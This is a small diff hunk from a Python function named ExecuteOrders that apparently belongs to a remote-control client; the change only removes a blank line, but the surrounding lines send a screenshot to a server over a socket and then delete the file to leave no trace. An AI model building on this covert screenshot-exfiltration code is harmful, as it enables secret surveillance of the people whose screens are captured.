@@ -77,7 +77,6 @@ def ExecuteOrders():
 
                     S.sendall(Data) # Send the Screenshot
 
-                    
             	F.close() # Close The File
             	
             	os.remove(Path) # Delete Screenshot after sending it to server
